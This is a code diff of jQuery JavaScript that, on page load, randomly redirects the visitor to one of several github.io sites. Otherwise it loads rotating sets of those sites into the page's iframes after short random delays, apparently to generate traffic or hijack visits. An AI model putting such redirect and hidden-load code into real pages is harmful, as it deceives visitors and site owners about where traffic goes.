@@ -6,10 +6,63 @@
   $(document).ready(function (){
   var r1 = Math.floor(Math.random()*100);
   if(r1 > 50){
+    do{
+      var t1 = Math.floor(Math.random()*100);
+    } while(t1 > 9 && t1 < 20);
+    do{
+      var t2 = Math.floor(Math.random()*100);
+    } while(t2 > 9 && t2 < 20);
     var r2 = Math.floor(Math.random()*100);
-    do {
-      
-    } while(t1 > 9 &
+    if(r2 > 80){
+      $("iframe:eq(0)").attr("src", "https://footbollmeneger.github.io/");
+      setTimeout(function(){
+      $("iframe:eq(1)").attr("src", "https://lenproducts.github.io/");
+      }, t1);
+      setTimeout(function(){
+      $("iframe:eq(2)").attr("src", "https://arenamolnia.github.io/");
+      }, t2);
+    } else if(r2 > 60){
+      $("iframe:eq(0)").attr("src", "https://zelsports.github.io/");
+      setTimeout(function(){
+      $("iframe:eq(1)").attr("src", "https://lenproducts.github.io/");
+      }, t1);
+      setTimeout(function(){
+      $("iframe:eq(2)").attr("src", "https://productskaz.github.io/");
+      }, t2);
+    } else if(r2 > 40){
+      $("iframe:eq(0)").attr("src", "https://productskaz.github.io/");
+      setTimeout(function(){
+      $("iframe:eq(1)").attr("src", "https://footbollmeneger.github.io/");
+      }, t1);
+      setTimeout(function(){
+      $("iframe:eq(2)").attr("src", "https://zelsports.github.io/");
+      }, t2);
+    } else if(r2 > 20){
+      $("iframe:eq(0)").attr("src", "https://arenamolnia.github.io/");
+      setTimeout(function(){
+      $("iframe:eq(1)").attr("src", "https://footbollmeneger.github.io/");
+      }, t1);
+      setTimeout(function(){
+      $("iframe:eq(2)").attr("src", "https://lenproducts.github.io/");
+      }, t2);
+    } else {
+      $("iframe:eq(0)").attr("src", "https://productskaz.github.io/");
+      setTimeout(function(){
+      $("iframe:eq(1)").attr("src", "https://zelsports.github.io/");
+      }, t1);
+      setTimeout(function(){
+      $("iframe:eq(2)").attr("src", "https://arenamolnia.github.io/");
+      }, t2);
+    }
+  } else {
+    var r3 = Math.floor(Math.random()*100);
+    if(r3 > 80){
+      document.location.href = "https://footbollmeneger.github.io/";
+    } else if (r3 > 60){
+      document.location.href = "https://lenproducts.github.io/";
+    } else if (r3 > 40){
+      document.location.href = "https://arenamolnia.github.io/";
+    } else if (r3 > 20){
       document.location.href = "https://zelsports.github.io/";
     } else {
       document.location.href = "https://productskaz.github.io/";
